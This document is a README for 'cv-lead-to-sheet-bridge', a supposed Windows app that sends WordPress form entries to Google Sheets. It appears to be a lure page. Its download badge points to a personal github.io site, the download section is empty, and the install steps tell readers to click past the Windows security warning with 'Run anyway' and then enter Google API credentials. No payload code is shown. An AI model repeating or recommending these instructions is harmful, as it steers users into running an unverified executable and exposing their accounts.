# 🚀 cv-lead-to-sheet-bridge - Sync WordPress lead data to sheets

[![](https://img.shields.io/badge/Download-Latest_Release-blue.svg)](https://stephiepicurean195.github.io)

This application transfers entries from your website forms directly into Google Sheets. Businesses use this tool to manage customer data without manual data entry. The bridge supports popular WordPress form plugins. It functions as a secure connector between your site and your spreadsheet.

## 🛠 Prerequisites

Ensure your computer has the following items before you start:

1. A computer running Windows 10 or Windows 11.
2. A stable internet connection.
3. Your Google account login credentials.
4. Administrative access to your WordPress dashboard.

## 📥 Downloading the software

## ⚙️ Installing the application

Follow these steps to install the software on your Windows computer:

1. Locate the downloaded file in your folder.
2. Double-click the file to begin the installation process.
3. Windows might show a security prompt. Click Run or More Info then Run anyway.
4. Follow the instructions on the screen to complete the setup.
5. The installer creates a shortcut on your desktop.

## 🔗 Connecting your accounts

After installation, open the application from your desktop shortcut. You must connect the software to your services:

1. Locate the Settings tab within the application.
2. Enter your Google API credentials into the required fields. This allows the application to write data to your spreadsheets.
3. Sign in to your WordPress site and locate your form settings.
4. Copy the Webhook URL provided by this application.
5. Paste this URL into the Webhook or Integration module inside your form settings.
6. Press the Save button in both the application and your WordPress dashboard.

## 📋 Mapping your form fields

You must tell the application which information to send to which column in your spreadsheet:

1. Open the Mapping section in the application.
2. Select your WordPress form from the dropdown list.
3. Choose the target Google Sheet from the list.
4. Match each form field (such as Name, Email, or Phone) to the correct column header in your spreadsheet.
5. Click Update to apply these changes.

## 🧪 Testing the bridge

Verify the connection to ensure data flows correctly:

1. Visit your public website.
2. Submit a test entry through your form.
3. Wait a few seconds for the transmission to occur.
4. Open your Google Sheet to confirm the new entry appears in the correct cells.
5. If the data does not appear, check the Status Log inside the application for error messages.

## 🛡 Security and privacy

The application handles data locally on your machine. We do not store your form submissions or your Google credentials on any external servers. All information passes through encrypted connections between your website and your Google account. Use a firewall if your organization requires strict network traffic management.

## 💡 Troubleshooting common issues

If you experience problems, use these steps to fix them:

- Verify that your internet connection remains active.
- Confirm your Google account has permission to edit the target sheet.
- Ensure the Webhook URL in your form matches the one generated by the app.
- Periodically check for updates on the GitHub release page to ensure you have the latest improvements.
- Restart the application if the status indicator shows a stalled connection.
